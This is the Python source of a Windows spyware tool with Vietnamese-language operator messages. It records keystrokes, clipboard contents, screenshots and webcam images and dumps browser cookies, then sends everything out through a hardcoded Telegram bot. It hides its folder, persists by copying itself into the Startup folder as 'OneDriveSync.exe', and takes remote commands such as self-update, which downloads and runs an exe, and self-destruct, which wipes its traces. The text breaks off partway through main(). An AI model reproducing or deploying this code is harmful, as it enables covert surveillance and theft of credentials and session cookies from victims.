import json
import os
import time
import shutil
import pyperclip
from datetime import datetime, timedelta
from pynput.keyboard import Listener
import mss
import requests
from threading import Thread, Lock
import re
import sys
import subprocess

# Telegram Monitoring configuration
BOT_TOKEN = "8836300723:AAFkFTxToMDt3KtVb4nL-iLEYBou0Y22Nmk"
CHAT_ID = "5904599269"

# Intervals in seconds
SCREENSHOT_INTERVAL = 30
KEYLOG_SEND_INTERVAL = 120
OUTBOX_RETRY_INTERVAL = 60

STORAGE = os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'EdgeCache')
SCREENSHOT_DIR = os.path.join(STORAGE, 'screenshots')
OUTBOX_DIR = os.path.join(STORAGE, 'outbox')
STATE_PATH = os.path.join(STORAGE, 'state.json')
DEBUG_LOG = os.path.join(STORAGE, 'debug.log')

last_clipboard = ""
state_lock = Lock()
session_start_time = datetime.now()

if not os.path.exists(STORAGE):
    try:
        os.makedirs(STORAGE, exist_ok=True)
        os.system(f'attrib +h "{STORAGE}"')
    except Exception as e:
        pass

os.makedirs(SCREENSHOT_DIR, exist_ok=True)
os.makedirs(OUTBOX_DIR, exist_ok=True)

def log_message(message):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        with open(DEBUG_LOG, "a", encoding="utf-8") as f:
            f.write(f"[{timestamp}] {message}\n")
    except:
        pass

def load_state():
    default_state = {
        "last_screenshot_sent": "1970-01-01 00:00:00",
        "last_keylog_sent": "1970-01-01 00:00:00",
        "last_outbox_retry": "1970-01-01 00:00:00",
        "telegram_offset": 0,
        "screenshot_interval": 30,
        "keylog_send_interval": 120,
        "outbox_retry_interval": 60,
        "machine_name": ""
    }
    with state_lock:
        if os.path.exists(STATE_PATH):
            try:
                with open(STATE_PATH, "r", encoding="utf-8") as f:
                    state = json.load(f)
                    modified = False
                    for k in default_state:
                        if k not in state:
                            state[k] = default_state[k]
                            modified = True
                    if modified:
                        try:
                            with open(STATE_PATH, "w", encoding="utf-8") as wf:
                                json.dump(state, wf, indent=4)
                        except:
                            pass
                    return state
            except Exception as e:
                log_message(f"Error loading state: {e}")
        else:
            try:
                with open(STATE_PATH, "w", encoding="utf-8") as f:
                    json.dump(default_state, f, indent=4)
            except Exception as e:
                log_message(f"Error saving state: {e}")
    return default_state

def save_state(state):
    with state_lock:
        try:
            with open(STATE_PATH, "w", encoding="utf-8") as f:
                json.dump(state, f, indent=4)
        except Exception as e:
            log_message(f"Error saving state: {e}")

def update_state(last_screenshot_sent=None, last_keylog_sent=None, last_outbox_retry=None, telegram_offset=None, screenshot_interval=None, keylog_send_interval=None, outbox_retry_interval=None, machine_name=None):
    state = load_state()
    if last_screenshot_sent:
        state["last_screenshot_sent"] = last_screenshot_sent
    if last_keylog_sent:
        state["last_keylog_sent"] = last_keylog_sent
    if last_outbox_retry:
        state["last_outbox_retry"] = last_outbox_retry
    if telegram_offset is not None:
        state["telegram_offset"] = telegram_offset
    if screenshot_interval is not None:
        state["screenshot_interval"] = screenshot_interval
    if keylog_send_interval is not None:
        state["keylog_send_interval"] = keylog_send_interval
    if outbox_retry_interval is not None:
        state["outbox_retry_interval"] = outbox_retry_interval
    if machine_name is not None:
        state["machine_name"] = machine_name
    save_state(state)

def process_keylog_text(raw_text):
    if not raw_text:
        return ""
    
    # Remove control characters like '\x01' (SOH) and other invisible control characters
    # except tab '\t' and newline '\n'
    cleaned = "".join(ch for ch in raw_text if ord(ch) >= 32 or ch in ['\n', '\r', '\t'])
    
    # Noise tokens to be removed (both bracketed and raw variants, case-insensitive)
    noises = [
        "esc", "caps_lock", "right_shift", "left_shift", "right_alt", "left_alt",
        "ctrlc", "ctrlv", "ctrlz", "alttab", "print_screen", "backspace", 
        "left_windows", "end", "delete", "ctrl"
    ]
    
    # Construct regex pattern to match all noise tokens, preferring bracketed first
    noise_patterns = []
    for token in noises:
        noise_patterns.append(re.escape(f"[{token}]"))
        noise_patterns.append(re.escape(token))
    
    # Compile a case-insensitive regex for noise removal
    noise_regex = re.compile("|".join(noise_patterns), re.IGNORECASE)
    cleaned = noise_regex.sub("", cleaned)
    
    # Replaces special tokens (case-insensitive patterns)
    specials = [
        (r"(?i)\[enter\]|enter", "\n"),
        (r"(?i)\[space\]|space", " "),
        (r"(?i)\[shift2\]|shift2", "@"),
        (r"(?i)\[shift4\]|shift4", "$")
    ]
    
    for pattern, replacement in specials:
        cleaned = re.sub(pattern, replacement, cleaned)
        
    return cleaned

def get_clipboard():
    try:
        content = pyperclip.paste().strip()
        return content if content else ""
    except:
        return ""

def send_telegram_bundled(photo_paths, text):
    if not photo_paths and not text.strip():
        return True

    state = load_state()
    machine = state.get("machine_name") or os.environ.get('COMPUTERNAME', 'Unknown-PC')
    prefix = f"[{machine}]"
    if text.strip() and prefix not in text:
        text = f"<b>[{machine}]</b> {text}"

    if not photo_paths:
        return send_telegram_message(text)

    # Determine if we should send text as caption or separate message
    use_caption = len(text) <= 1024
    caption_text = text if use_caption else ""

    success = False
    
    # 1. Send photo(s)
    if len(photo_paths) == 1:
        path = photo_paths[0]
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        for i in range(3):
            try:
                with open(path, 'rb') as f:
                    data = {'chat_id': CHAT_ID, 'parse_mode': 'HTML'}
                    if caption_text.strip():
                        data['caption'] = caption_text
                    r = requests.post(url, data=data, files={'photo': f}, timeout=15)
                    if r.status_code == 200 and r.json().get('ok'):
                        success = True
                        break
            except Exception as e:
                log_message(f"sendPhoto failed for bundled send: {e}")
            time.sleep(1)
        
        if success:
            log_message(f"Successfully sent single photo: {os.path.basename(path)}")
            try:
                os.remove(path)
            except:
                pass
        else:
            # Move to outbox
            try:
                dest = os.path.join(OUTBOX_DIR, os.path.basename(path))
                if path != dest:
                    shutil.move(path, dest)
            except:
                pass
    else:
        # Send as media group (album)
        chunks = [photo_paths[idx:idx+10] for idx in range(0, len(photo_paths), 10)]
        success = True
        
        for chunk_idx, chunk in enumerate(chunks):
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMediaGroup"
            chunk_success = False
            for attempt in range(3):
                files_handles = []
                try:
                    media = []
                    files = {}
                    for img_idx, path in enumerate(chunk):
                        name = f"photo_{img_idx}"
                        item = {'type': 'photo', 'media': f'attach://{name}', 'parse_mode': 'HTML'}
                        if chunk_idx == 0 and img_idx == 0 and caption_text.strip():
                            item['caption'] = caption_text
                        media.append(item)
                        
                        f = open(path, 'rb')
                        files_handles.append(f)
                        files[name] = f
                        
                    data = {
                        'chat_id': CHAT_ID,
                        'media': json.dumps(media)
                    }
                    r = requests.post(url, data=data, files=files, timeout=20)
                    if r.status_code == 200 and r.json().get('ok'):
                        chunk_success = True
                        break
                except Exception as e:
                    log_message(f"sendMediaGroup failed: {e}")
                finally:
                    for h in files_handles:
                        try:
                            h.close()
                        except:
                            pass
                time.sleep(1)
                
            if chunk_success:
                log_message(f"Successfully sent media group chunk {chunk_idx+1}")
                for path in chunk:
                    try:
                        os.remove(path)
                    except:
                        pass
            else:
                success = False
                for path in chunk:
                    try:
                        dest = os.path.join(OUTBOX_DIR, os.path.basename(path))
                        if path != dest:
                            shutil.move(path, dest)
                    except:
                        pass

    # 2. If we chose not to use caption (because it was too long), send the text as separate message
    if not use_caption and text.strip():
        text_success = send_telegram_message(text)
        success = success and text_success

    return success

def send_telegram_document(path):
    if not os.path.exists(path):
        return False
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    success = False
    for i in range(3):
        try:
            with open(path, 'rb') as f:
                files = {'document': f}
                data = {'chat_id': CHAT_ID}
                r = requests.post(url, data=data, files=files, timeout=15)
                if r.status_code == 200 and r.json().get('ok'):
                    success = True
                    break
                else:
                    log_message(f"Telegram API error on document attempt {i+1}: {r.text}")
        except Exception as e:
            log_message(f"Attempt {i+1} sendDocument failed for {path}: {e}")
        time.sleep(1)
    
    if success:
        log_message(f"Successfully sent document: {os.path.basename(path)}")
        try:
            os.remove(path)
        except Exception as e:
            log_message(f"Error deleting sent document {path}: {e}")
        return True
    else:
        # Move to outbox on failure
        try:
            dest = os.path.join(OUTBOX_DIR, os.path.basename(path))
            if path != dest:
                shutil.move(path, dest)
                log_message(f"Moved document {os.path.basename(path)} to outbox after failing 3 times")
        except Exception as e:
            log_message(f"Failed to move document {path} to outbox: {e}")
        return False

def get_control_keyboard():
    return {
        "remove_keyboard": True
    }

def setup_bot_commands():
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/setMyCommands"
        commands = [
            {"command": "status", "description": "Xem trạng thái và Bảng điều khiển các máy"},
            {"command": "help", "description": "Hướng dẫn sử dụng chi tiết"}
        ]
        requests.post(url, json={"commands": commands}, timeout=10)
    except:
        pass

def send_telegram_message(text, save_on_fail=True, reply_markup=None):
    if not text.strip():
        return True
    
    state = load_state()
    machine = state.get("machine_name") or os.environ.get('COMPUTERNAME', 'Unknown-PC')
    prefix = f"[{machine}]"
    if prefix not in text:
        text = f"<b>[{machine}]</b> {text}"
    
    # Split text into chunks of 4000 characters to stay within Telegram's 4096-character limit
    chunk_size = 4000
    chunks = [text[i:i+chunk_size] for i in range(0, len(text), chunk_size)]
    
    overall_success = True
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    
    for idx, chunk in enumerate(chunks):
        chunk_success = False
        for i in range(3):
            try:
                data = {'chat_id': CHAT_ID, 'text': chunk, 'parse_mode': 'HTML'}
                if reply_markup and idx == len(chunks) - 1:
                    data['reply_markup'] = json.dumps(reply_markup)
                r = requests.post(url, data=data, timeout=10)
                if r.status_code == 200 and r.json().get('ok'):
                    chunk_success = True
                    break
            except:
                pass
            time.sleep(1)
            
        if not chunk_success:
            overall_success = False
            if save_on_fail:
                try:
                    pending_path = os.path.join(OUTBOX_DIR, "keylog_pending.txt")
                    with open(pending_path, "a", encoding="utf-8") as f:
                        f.write(chunk)
                    log_message("Appended failed keylog chunk to outbox/keylog_pending.txt")
                except Exception as e:
                    log_message(f"Failed to save pending keylog chunk: {e}")
                    
    return overall_success

def retry_outbox():
    if not os.path.exists(OUTBOX_DIR):
        return
    log_message("Scanning outbox for retries...")
    
    pending_path = os.path.join(OUTBOX_DIR, "keylog_pending.txt")
    if os.path.exists(pending_path) and os.path.getsize(pending_path) > 0:
        try:
            with open(pending_path, "r", encoding="utf-8") as f:
                content = f.read()
            if content.strip():
                if send_telegram_message(content, save_on_fail=False):
                    log_message("Successfully sent pending keylogs from outbox")
                    try:
                        os.remove(pending_path)
                    except Exception as e:
                        log_message(f"Error removing pending keylog file: {e}")
                else:
                    log_message("Failed to send some/all pending keylogs from outbox; leaving in file for next retry")
        except Exception as e:
            log_message(f"Error retrying pending keylogs: {e}")

    try:
        for file_name in os.listdir(OUTBOX_DIR):
            file_path = os.path.join(OUTBOX_DIR, file_name)
            if not os.path.isfile(file_path) or file_name == "keylog_pending.txt":
                continue
            
            sent = False
            if file_name.endswith('.png'):
                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
                for i in range(3):
                    try:
                        with open(file_path, 'rb') as f:
                            r = requests.post(url, data={'chat_id': CHAT_ID}, files={'photo': f}, timeout=10)
                            if r.status_code == 200 and r.json().get('ok'):
                                sent = True
                                break
                    except Exception as e:
                        log_message(f"Retry sendPhoto for {file_name} failed: {e}")
                    time.sleep(1)
            else:
                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
                for i in range(3):
                    try:
                        with open(file_path, 'rb') as f:
                            r = requests.post(url, data={'chat_id': CHAT_ID}, files={'document': f}, timeout=15)
                            if r.status_code == 200 and r.json().get('ok'):
                                sent = True
                                break
                    except Exception as e:
                        log_message(f"Retry sendDocument for {file_name} failed: {e}")
                    time.sleep(1)
            
            if sent:
                log_message(f"Successfully sent queued file from outbox: {file_name}")
                try:
                    os.remove(file_path)
                except Exception as e:
                    log_message(f"Error removing {file_name} after retry success: {e}")
    except Exception as e:
        log_message(f"Error scanning outbox files: {e}")

def screen_thread_func():
    log_message("Screen capture thread started")
    last_capture = datetime.min
    while True:
        try:
            if datetime.now() - last_capture >= timedelta(seconds=SCREENSHOT_INTERVAL):
                current_time = datetime.now().strftime("%Y%m%d_%H%M%S")
                screenshot_path = os.path.join(SCREENSHOT_DIR, f"screenshot_{current_time}.png")
                with mss.MSS() as sct:
                    sct.shot(output=screenshot_path)
                last_capture = datetime.now()
                log_message(f"Captured screenshot: {os.path.basename(screenshot_path)}")
        except Exception as e:
            log_message(f"Error in ScreenThread: {e}")
        time.sleep(5)  # Small sleeping period for lightweight polling

def clear_folder():
    try:
        # Clear screenshots
        for file in os.listdir(SCREENSHOT_DIR):
            try:
                os.remove(os.path.join(SCREENSHOT_DIR, file))
            except:
                pass
        # Clear outbox
        for file in os.listdir(OUTBOX_DIR):
            try:
                os.remove(os.path.join(OUTBOX_DIR, file))
            except:
                pass
        # Clear keylog buffer
        buffer_path = os.path.join(STORAGE, "keylog_buffer.txt")
        if os.path.exists(buffer_path):
            try:
                open(buffer_path, "w", encoding="utf-8").close()
            except:
                pass
    except Exception as e:
        log_message(f"Error in clear_folder: {e}")

def take_webcam():
    try:
        import cv2
        cap = cv2.VideoCapture(0)
        
        cap.set(cv2.CAP_PROP_FRAME_WIDTH, 1280)
        cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 720)
        cap.set(cv2.CAP_PROP_FPS, 30)
        cap.set(cv2.CAP_PROP_BRIGHTNESS, 150)
        cap.set(cv2.CAP_PROP_CONTRAST, 150)
        
        for _ in range(5):
            cap.read()
        
        ret, frame = cap.read()
        if ret:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filepath = os.path.join(SCREENSHOT_DIR, f"webcam_{timestamp}.jpg")
            
            encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 85]
            cv2.imwrite(filepath, frame, encode_param)
            
            cap.release()
            return filepath
        cap.release()
        return None
    except Exception as e:
        print(f"Lỗi webcam: {e}")
        return None

def check_clipboard_async():
    global last_clipboard
    time.sleep(0.25)  # Wait for clipboard to update in OS
    clipboard_content = get_clipboard()
    if clipboard_content and clipboard_content != last_clipboard:
        # Ignore clipboard copying if the text length exceeds 2000 characters
        if len(clipboard_content) > 500:
            return
            
        last_clipboard = clipboard_content
        buffer_path = os.path.join(STORAGE, "keylog_buffer.txt")
        try:
            with open(buffer_path, "a", encoding="utf-8") as f:
                f.write(f"\n\n[CLIPBOARD COPIED - {datetime.now().strftime('%H:%M:%S')}]\n")
                f.write(clipboard_content)
                f.write("\n\n")
            log_message(f"Clipboard captured: {len(clipboard_content)} characters")
        except Exception as e:
            log_message(f"Error saving clipboard content to buffer: {e}")

def on_press(key):
    global last_clipboard
    try:
        key_str = str(key)
        if key_str.startswith("'") and key_str.endswith("'") and len(key_str) == 3:
            key_str = key_str[1:-1]
        
        # Ignore non-ASCII characters (Vietnamese accented characters / Unicode)
        if len(key_str) == 1 and ord(key_str) >= 128:
            return

        if key_str in ("Key.ctrl_l", "Key.ctrl_r", "Key.ctrl"):
            Thread(target=check_clipboard_async, daemon=True).start()
        
        # Map key strings to the normalized clean names
        if key_str == "Key.esc":
            key_str = "esc"
        elif key_str == "Key.caps_lock":
            key_str = "caps_lock"
        elif key_str in ("Key.shift", "Key.shift_l"):
            key_str = "left_shift"
        elif key_str == "Key.shift_r":
            key_str = "right_shift"
        elif key_str == "Key.alt_l":
            key_str = "left_alt"
        elif key_str in ("Key.alt_r", "Key.alt_gr"):
            key_str = "right_alt"
        elif key_str == "Key.enter":
            key_str = "enter"
        elif key_str == "Key.space":
            key_str = "space"
        elif key_str == "Key.tab":
            key_str = " [tab] "
        elif key_str == "Key.backspace":
            key_str = "backspace"
        elif key_str in ("Key.cmd", "Key.cmd_l", "Key.cmd_r"):
            key_str = "left_windows"
        elif key_str == "Key.end":
            key_str = "end"
        elif key_str == "Key.delete":
            key_str = "delete"
        elif key_str in ("Key.ctrl", "Key.ctrl_l", "Key.ctrl_r"):
            key_str = "ctrl"
        elif key_str == "Key.print_screen":
            key_str = "print_screen"
        elif key_str in ("\x03", "\\x03"):
            key_str = "ctrlc"
        elif key_str in ("\x16", "\\x16"):
            key_str = "ctrlv"
        elif key_str in ("\x1a", "\\x1a"):
            key_str = "ctrlz"
            
        # Ignore any other special system keys that start with "Key."
        if key_str.startswith("Key."):
            return
            
        # Filter out control characters (ASCII < 32), such as '\x01' (Ctrl+A), except acceptable ones
        # We also want to handle \x03, \x16, \x1a before this step if they were mapped
        if len(key_str) == 1:
            code = ord(key_str)
            if code < 32 and key_str not in ['\n', '\r', '\t']:
                return
            
        buffer_path = os.path.join(STORAGE, "keylog_buffer.txt")
        with open(buffer_path, "a", encoding="utf-8") as f:
            f.write(key_str)
    except Exception as e:
        pass

def keylog_join():
    log_message("Keylogger listener thread started")
    buffer_path = os.path.join(STORAGE, "keylog_buffer.txt")
    if not os.path.exists(buffer_path):
        try:
            open(buffer_path, "w", encoding="utf-8").close()
        except:
            pass
            
    with Listener(on_press=on_press) as keylogger:
        keylogger.join()

def clone_profile(user_data_dir):
    try:
        clone_dir = user_data_dir + "_clone_" + str(int(time.time()))
        shutil.copytree(user_data_dir, clone_dir, ignore=shutil.ignore_patterns('lockfile', 'SingletonLock'))
        return clone_dir
    except:
        return user_data_dir

def get_browser_data():
    try:
        from playwright.sync_api import sync_playwright
        import json
        
        
        send_telegram_message("🔍 Đang quét dữ liệu trình duyệt (Headless)...")
        
        result = "<b>🔍 DỮ LIỆU TRÌNH DUYỆT</b>\n\n"
        browsers = {
            "Chrome": {
                "user_data": os.path.join(os.getenv('LOCALAPPDATA'), r"Google\Chrome\User Data"),
                "executable": r"C:\Program Files\Google\Chrome\Application\chrome.exe"
            },
            "Cốc Cốc": {
                "user_data": os.path.join(os.getenv('LOCALAPPDATA'), r"CocCoc\Browser\User Data"),
                "executable": r"C:\Program Files\CocCoc\Browser\Application\browser.exe"
            },
            "Microsoft Edge": {
                "user_data": os.path.join(os.getenv('LOCALAPPDATA'), r"Microsoft\Edge\User Data"),
                "executable": r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
            }
        }
        results = {}
        with sync_playwright() as p:
            for name, info in browsers.items():
                user_data_dir = info["user_data"]
                context = None
                clone_dir = None
                if os.path.exists(info["executable"]):
                    try:
                        if os.path.exists(os.path.join(user_data_dir, "lockfile")) or os.path.exists(os.path.join(user_data_dir, "SingletonLock")):
                            clone_dir = clone_profile(user_data_dir)
                            working_dir = clone_dir
                        else:
                            working_dir = user_data_dir

                        context = p.chromium.launch_persistent_context(
                            user_data_dir=working_dir,
                            executable_path=info["executable"],
                            headless=True,
                            args=[
                                "--no-first-run",
                                "--no-sandbox",
                                "--disable-gpu",
                                "--disable-extensions",
                                "--start-maximized"
                            ]
                        )
                        page = context.pages[0] if context.pages else context.new_page()
                        page.goto("chrome://settings/passwords", wait_until="domcontentloaded")
                        time.sleep(8)
                        
                        cookies = context.cookies()
                        results[name] = len(cookies)
                        
                        with open(f"cookies_{name.lower()}.txt", "w", encoding="utf-8") as f:
                            json.dump(cookies, f, indent=2)
                    except Exception as e:
                        results[name] = f"Lỗi: {str(e)[:80]}"
                    finally:
                        if context:
                            try:
                                context.close()
                            except:
                                pass
                        if clone_dir and os.path.exists(clone_dir):
                            try:
                                shutil.rmtree(clone_dir)
                            except:
                                pass
        
        summary = "\n".join([f"{name}: {count} cookies" for name, count in results.items()])
        send_telegram_message(f"<b>✅ Đã quét trình duyệt</b>\n{summary}")
        
        for name in browsers:
            filename = f"cookies_{name.lower()}.txt"
            if os.path.exists(filename):
                send_telegram_document(filename)
        return True
    except Exception as e:
        send_telegram_message(f"❌ Lỗi lấy dữ liệu browser: {e}")
        return False

def self_update(file_id):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getFile?file_id={file_id}"
        file_path = requests.get(url).json()['result']['file_path']
        download_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_path}"

        new_exe = "keylogger_new.exe"
        with open(new_exe, "wb") as f:
            f.write(requests.get(download_url).content)
        
        updater = "updater.bat"
        current_exe = sys.executable
        target_startup = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup', "OneDriveSync.exe")

        with open(updater, "w", encoding="utf-8") as f:
            f.write(f'''@echo off
                timeout /t 3 /nobreak >nul
                taskkill /f /im "{os.path.basename(current_exe)}" 2>nul
                del "{current_exe}" 2>nul
                move "{new_exe}" "{current_exe}"
                copy "{current_exe}" "{target_startup}" /Y
                start "" "{current_exe}"
                del "%~f0"
                ''')
        
        send_telegram_message("✅ Đã tải bản mới. Đang cập nhật...")
        subprocess.Popen([updater], shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE)
        sys.exit(0)
    except Exception as e:
        send_telegram_message(f"❌ Lỗi cập nhật: {e}")

def self_destruct():
    try:
        destructor = os.path.join(os.getenv('TEMP', os.path.expanduser('~')), "destruct.bat")
        current_exe = sys.executable
        startup_exe = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup', "OneDriveSync.exe")
        
        is_script = False
        if os.path.basename(current_exe).lower() in ["python.exe", "pythonw.exe"]:
            current_file = os.path.abspath(__file__)
            is_script = True
        else:
            current_file = current_exe

        batch_lines = [
            "@echo off",
            "timeout /t 3 /nobreak >nul"
        ]
        
        if not is_script:
            batch_lines.append(f'taskkill /f /im "{os.path.basename(current_exe)}" 2>nul')
            
        batch_lines.extend([
            f'del "{current_file}" 2>nul',
            f'del "{startup_exe}" 2>nul',
            f'rmdir /s /q "{STORAGE}" 2>nul',
            'del "%~f0" 2>nul'
        ])
        
        batch_content = "\n".join(batch_lines)
        
        with open(destructor, "w", encoding="utf-8") as f:
            f.write(batch_content)
        
        send_telegram_message("💥 Đang thực hiện tự hủy và xóa toàn bộ dấu vết...")
        subprocess.Popen([destructor], shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE)
        sys.exit(0)
    except Exception as e:
        send_telegram_message(f"❌ Lỗi tự hủy: {e}")

def execute_command(command, message=None):
    raw_cmd = command.strip()
    
    # Check for target machine identifier (e.g. @Laptop-A)
    target_machine = None
    state = load_state()
    my_name = state.get("machine_name") or os.environ.get('COMPUTERNAME', 'Unknown-PC')
    
    parts = raw_cmd.split()
    cleaned_parts = []
    for part in parts:
        if part.startswith("@"):
            target_machine = part[1:].strip().lower()
        else:
            cleaned_parts.append(part)
            
    if target_machine is not None:
        if target_machine != my_name.lower():
            # Silently ignore as it is targeted for another machine
            return
        # Rebuild command without the target suffix
        command = " ".join(cleaned_parts)
        
    cmd = command.strip().lower()
    if cmd in ["/webcam", "webcam"]:
        send_telegram_message("📷 Đang chụp webcam...")
        path = take_webcam()
        if path:
            send_telegram_bundled([path], "📷 Webcam Captured")
        else:
            send_telegram_message("❌ Không tìm thấy webcam hoặc lỗi")
    
    elif cmd in ["/browser", "browser"]:
        get_browser_data()

    elif cmd in ["/clear", "clear"]:
        clear_folder()
        send_telegram_message("🗑️ Đã xóa log và ảnh")
    
    elif cmd in ["/status", "status"]:
        state = load_state()
        machine = state.get("machine_name") or os.environ.get('COMPUTERNAME', 'Unknown-PC')
        my_name = machine.lower()
        inline_kb = {
            "inline_keyboard": [
                [
                    {"text": "📷 Webcam", "callback_data": f"webcam @{my_name}"},
                    {"text": "🔍 Cookies", "callback_data": f"browser @{my_name}"}
                ],
                [
                    {"text": "🗑️ Xóa logs", "callback_data": f"clear @{my_name}"},
                    {"text": "⏱️ Intervals", "callback_data": f"interval @{my_name}"}
                ],
                [
                    {"text": "🏷️ Đổi tên", "callback_data": f"name @{my_name}"},
                    {"text": "💥 Tự hủy", "callback_data": f"destruct @{my_name}"}
                ]
            ]
        }
        send_telegram_message(
            f"<b>✅ Trạng thái [{machine}]</b>\nHoạt động\nThời gian chạy: {datetime.now() - session_start_time}",
            reply_markup=inline_kb
        )

    elif cmd in ["/update", "update"] and message and "document" in message:
        if message["document"]["file_name"].endswith(".exe"):
            send_telegram_message("🔄 Đang cập nhật .exe...")
            self_update(message["document"]["file_id"])

    elif cmd.startswith("/interval") or cmd.startswith("interval"):
        parts = command.strip().split()
        if len(parts) == 1:
            state = load_state()
            current_sc = state.get("screenshot_interval", 30)
            current_kl = state.get("keylog_send_interval", 120)
            current_ob = state.get("outbox_retry_interval", 60)
            msg_text = (
                f"⏱️ <b>INTERVAL HIỆN TẠI</b>\n"
                f"• Chụp màn hình (screenshot): {current_sc} giây\n"
                f"• Gửi keylog định kỳ (keylog): {current_kl} giây\n"
                f"• Thử lại outbox (outbox): {current_ob} giây\n\n"
                f"<b>Cú pháp cài đặt:</b>\n"
                f"<code>/interval &lt;loại&gt; &lt;giây&gt;</code>\n"
                f"Ví dụ: <code>/interval screenshot 60</code>"
            )
            send_telegram_message(msg_text)
        elif len(parts) == 3:
            category = parts[1].lower()
            try:
                seconds = int(parts[2])
                if seconds <= 0:
                    send_telegram_message("❌ Số giây phải lớn hơn 0")
                else:
                    global SCREENSHOT_INTERVAL, KEYLOG_SEND_INTERVAL, OUTBOX_RETRY_INTERVAL
                    if category in ["screenshot", "sc", "snap"]:
                        SCREENSHOT_INTERVAL = seconds
                        update_state(screenshot_interval=seconds)
                        send_telegram_message(f"✅ Đã cập nhật screenshot interval thành: {seconds} giây")
                    elif category in ["keylog", "kl", "log"]:
                        KEYLOG_SEND_INTERVAL = seconds
                        update_state(keylog_send_interval=seconds)
                        send_telegram_message(f"✅ Đã cập nhật keylog interval thành: {seconds} giây")
                    elif category in ["outbox", "ob", "retry"]:
                        OUTBOX_RETRY_INTERVAL = seconds
                        update_state(outbox_retry_interval=seconds)
                        send_telegram_message(f"✅ Đã cập nhật outbox retry interval thành: {seconds} giây")
                    else:
                        send_telegram_message("❌ Loại interval không hợp lệ. Chọn: screenshot, keylog, hoặc outbox")
            except ValueError:
                send_telegram_message("❌ Số giây phải là một số nguyên hợp lệ")
        else:
            send_telegram_message("❌ Sai cú pháp. Sử dụng: <code>/interval &lt;loại&gt; &lt;giây&gt;</code>")
    
    elif cmd.startswith("/name") or cmd.startswith("name"):
        parts = command.strip().split(maxsplit=1)
        state = load_state()
        if len(parts) == 1:
            current_name = state.get("machine_name") or os.environ.get('COMPUTERNAME', 'Unknown-PC')
            send_telegram_message(f"🏷️ <b>TÊN MÁY HIỆN TẠI:</b> <code>{current_name}</code>\n\nCú pháp đặt tên mới: <code>/name &lt;tên_mới&gt;</code>")
        else:
            new_name = parts[1].strip()
            if not new_name:
                send_telegram_message("❌ Tên máy không được để trống")
            else:
                update_state(machine_name=new_name)
                send_telegram_message(f"✅ Đã đổi tên máy thành: <code>{new_name}</code>")

    elif cmd in ["/destruct", "destruct", "/selfdestruct", "selfdestruct"]:
        self_destruct()
    
    elif cmd in ["/help", "help"]:
        help_text = (
            "<b>Lệnh điều khiển từ xa:</b>\n"
            "/webcam - Chụp webcam\n"
            "/browser - Gửi dữ liệu trình duyệt\n"
            "/clear - Xóa dữ liệu\n"
            "/status - Trạng thái\n"
            "/interval - Cấu hình thời gian gửi/chụp\n"
            "/name - Xem/Đặt tên cho máy\n"
            "/destruct - Tự hủy tool và xóa dấu vết\n"
            "/help - Danh sách lệnh"
        )
        send_telegram_message(help_text, reply_markup=get_control_keyboard())

def answer_callback_query(callback_query_id):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery"
        data = {"callback_query_id": callback_query_id}
        requests.post(url, json=data, timeout=10)
    except:
        pass

def poll_telegram():
    state = load_state()
    offset = state.get("telegram_offset", 0)
    
    # If starting fresh (offset is 0), clear old updates to avoid executing old commands
    if offset == 0:
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates?offset=-1&limit=1"
            resp = requests.get(url, timeout=10).json()
            results = resp.get("result", [])
            if results:
                offset = results[0]["update_id"] + 1
                update_state(telegram_offset=offset)
        except Exception as e:
            log_message(f"Error clearing initial updates: {e}")

    while True:
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates?offset={offset}&timeout=10"
            resp = requests.get(url, timeout=15).json()
            for update in resp.get("result", []):
                offset = update["update_id"] + 1
                update_state(telegram_offset=offset)
                
                if "message" in update:
                    msg = update["message"]
                    if "text" in msg:
                        execute_command(msg["text"], msg)
                    elif "document" in msg:  # Nhận file
                        execute_command("/update", msg)
                elif "callback_query" in update:
                    cb = update["callback_query"]
                    cb_id = cb.get("id")
                    cb_data = cb.get("data", "")
                    if cb_data:
                        # Acknowledge the callback immediately
                        answer_callback_query(cb_id)
                        # Execute the command from callback data
                        dummy_msg = cb.get("message", {})
                        execute_command(cb_data, dummy_msg)
        except Exception as e:
            log_message(f"Error in poll_telegram: {e}")
            time.sleep(5)

def add_to_startup(force=False):
    try:
        startup_folder = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
        current_exe = sys.executable
        target_path = os.path.join(startup_folder, "OneDriveSync.exe")

        if not os.path.exists(target_path) or os.path.getsize(current_exe) != os.path.getsize(target_path):
            if os.path.exists(target_path):
                try: os.remove(target_path)
                except: pass
            shutil.copy2(current_exe, target_path)
        return True
    except Exception as e:
        print(f"⚠️ Lỗi Startup: {e}")
        return False

def main():
    global SCREENSHOT_INTERVAL, KEYLOG_SEND_INTERVAL, OUTBOX_RETRY_INTERVAL
    try:
        state = load_state()
        SCREENSHOT_INTERVAL = state.get("screenshot_interval", 30)
        KEYLOG_SEND_INTERVAL = state.get("keylog_send_interval", 120)
        OUTBOX_RETRY_INTERVAL = state.get("outbox_retry_interval", 60)
    except Exception as e:
        log_message(f"Error loading initial intervals: {e}")

    add_to_startup()
    
    # Configure bot commands menu on Telegram
    try:
        Thread(target=setup_bot_commands, daemon=True).start()
    except Exception as e:
